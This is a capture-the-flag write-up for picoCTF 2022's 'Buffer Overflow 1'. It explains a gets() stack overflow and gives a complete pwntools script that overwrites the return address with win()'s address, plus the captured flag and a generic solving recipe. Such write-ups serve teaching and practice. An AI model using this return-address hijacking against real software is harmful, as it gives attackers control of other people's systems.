# Challenge Write-Up — Buffer Overflow 1

---

## 📌 Challenge Overview

| Field           | Information                                                                              |
| :-------------- | :--------------------------------------------------------------------------------------- |
| **Competition** | picoCTF 2022                                                                             |
| **Category**    | Binary Exploitation                                                                      |
| **Difficulty**  | Medium                                                                                   |
| **Objective**   | Overflow the buffer with the right amount of padding, then place the address of `win()` to redirect execution and get the flag |

---

## Initial Analysis

I was given a 32-bit binary and its source code. The challenge description hinted that the goal was to **control the return address** and jump to a function called `win()` that prints the flag.

This is a step up from Local Target. Instead of just overwriting a nearby variable, we need to overflow past the buffer all the way to the return address — the value the CPU reads to decide where to go after the current function finishes.

My plan:
- Read the source code to find the vulnerable input call
- Use a cyclic pattern to find the exact number of bytes needed to reach the return address
- Build a payload with padding followed by the address of `win()`
- Send it to the server and collect the flag

---

## 🔎 Step 1 — Read the Source Code

The vulnerable function was easy to find:

```c
void vuln() {
    char buf[32];
    gets(buf);
}
```

`gets()` reads input into `buf` with no size limit at all — even worse than `scanf("%s", ...)`. No matter how many characters you type, it keeps writing. This makes it a classic buffer overflow target.

The `win()` function existed in the binary but was never called. Our job was to make the program call it by hijacking the return address.

---

## Step 2 — Understand How Return Address Hijacking Works

When a function is called, the CPU saves a **return address** on the stack — the address it should go back to when the function finishes. That saved address sits right after the local variables on the stack.

If we overflow `buf` with enough bytes to reach the saved return address, we can replace it with any address we want. When `vuln()` hits its `ret` instruction, the CPU pops our planted address and jumps there instead of going back to `main()`.

Because this is a **32-bit** binary, the return address is exactly **4 bytes** wide. Our payload structure is:

```
[padding to fill the buffer and reach the return address] + [4-byte address of win()]
```

---

## Step 3 — Find the Padding Length Using a Cyclic Pattern

Instead of guessing how many bytes of padding we need, I used `pwntools`' `cyclic()` function to generate a unique pattern and fed it to the binary in a debugger.

```python
from pwn import cyclic
print(cyclic(100))
```

When the program crashed, the EIP register (which holds the next address to execute) contained part of the pattern. I used `cyclic_find()` to look up exactly which position that was:

```python
from pwn import cyclic_find
cyclic_find(0x6161616c)  # value found in EIP at crash
# → 44
```

The offset was **44 bytes**. That means we need 44 bytes of junk before the return address slot begins.

---

## Step 4 — Find the Address of `win()`

Since the binary is not stripped (function names are still in it) and has no PIE, `win()`'s address is fixed every run. `pwntools` can look it up directly from the binary file:

```python
from pwn import ELF
elf = ELF("./vuln")
win_addr = elf.symbols['win']
print(hex(win_addr))
```

No GDB needed. `pwntools` reads the binary's symbol table and hands us the address.

---

## Step 5 — Build and Send the Payload

With the offset and the address both known, the full exploit script looked like this:

```python
#!/usr/bin/env python3

from pwn import *

BINARY = "./vuln"
elf = ELF(BINARY)

# switch to False and set host/port to run against the remote server
LOCAL = False
if LOCAL:
    p = process(BINARY)
else:
    host = input("Host: ")
    port = int(input("Port: "))
    p = remote(host, port)

p.recvuntil(b":")

offset = 44
win_addr = elf.symbols['win']
payload = b"A" * offset + p32(win_addr)

p.sendline(payload)
p.interactive()
```

`p32()` packs the address as a 4-byte little-endian value, which is what a 32-bit binary expects on the stack.

Running this against the server redirected execution to `win()` and printed the flag. ✅

---

## 🏁 Flag

```
picoCTF{addr3ss3s_ar3_3asy_6462ca2d}
```

---

## 🔬 What Made This Work

The stack layout in memory is predictable. Local variables live at the top, and just below them sits the saved return address. If there is no limit on how much you can write into a local buffer, you can keep writing until you reach and overwrite that return address.

On a 32-bit binary with no PIE and no stack canary, there is nothing stopping us from doing exactly that. We just needed to:

1. Know how many bytes to write before hitting the return address (the cyclic pattern trick)
2. Know the address to write there (`win()` from the symbol table)

The `ret` instruction then did the rest — it read our planted address and jumped straight to `win()`.

Key difference from Local Target: there we were overwriting a nearby variable with a specific value. Here we are overwriting the return address with a function pointer to take over the control flow of the entire program.

---

## 🎯 How to Solve Challenges Like This

1. Find the unsafe input call in the source code (`gets`, `scanf("%s", ...)`, `strcpy`, etc.)
2. Generate a cyclic pattern with `pwntools` and feed it to the binary in a debugger
3. When it crashes, use `cyclic_find` on the value in EIP to get the exact offset
4. Use `ELF.symbols['win']` to get the target function address
5. Build the payload: `b"A" * offset + p32(win_address)`
6. Send it to the server and read the flag

---

## 🧩 Final Thoughts

Buffer Overflow 1 introduces one of the most fundamental techniques in binary exploitation: **return address hijacking**. Almost every advanced exploit in this category builds on this same idea — fill up a buffer, reach the return address, and replace it with something useful.

The fix here is simply to never use `gets()`. It has no safe usage at all and was actually removed from the C standard library in C11. Using `fgets(buf, sizeof(buf), stdin)` instead would cap the input to the buffer size and prevent any overflow from reaching the return address.

---
